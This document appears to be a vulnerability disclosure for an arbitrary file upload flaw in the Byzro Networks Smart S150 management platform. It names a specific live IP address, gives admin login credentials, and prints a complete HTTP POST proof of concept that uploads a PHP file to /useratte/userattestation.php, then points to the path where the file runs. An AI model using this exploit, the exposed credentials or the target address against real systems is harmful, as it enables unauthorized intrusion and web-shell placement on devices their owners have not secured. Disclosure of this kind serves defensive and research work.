There is a file upload vulnerability in Byzro Networks Smart S150 management platform

version:S150

Ip：https://218.205.129.204:8443/

1、The login interface is shown in the figure.

admin/b3f9t8k7

![image](https://github.com/tolkent/cve/assets/93599994/b88bbc0d-3dff-42bf-8dd7-470aba73f2f9)


2. Construct a POC and directly upload the 1.php file.

POC
```
POST /useratte/userattestation.php HTTP/1.1
Host: 218.205.129.204:8443
Cookie: PHPSESSID=8efec9a45b08e405fc0e79bfa7b0d0ac
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
Content-Length: 592
Origin: https://218.205.129.204:8443
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="web_img"; filename="1.php"
Content-Type: application/octet-stream

<?php echo 1234;?>
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="id_type"

1
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="1_ck"

1_radhttp
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="hidwel"

set
-----------------------------42328904123665875270630079328?
```
![image](https://github.com/tolkent/cve/assets/93599994/8c4b6e21-802c-4d2c-8732-c400fb5dbc29)

Visit /boot/web/upload/weblogo/1.php

![image](https://github.com/tolkent/cve/assets/93599994/28f411f7-8548-4da4-8cf5-115f54d1477b)

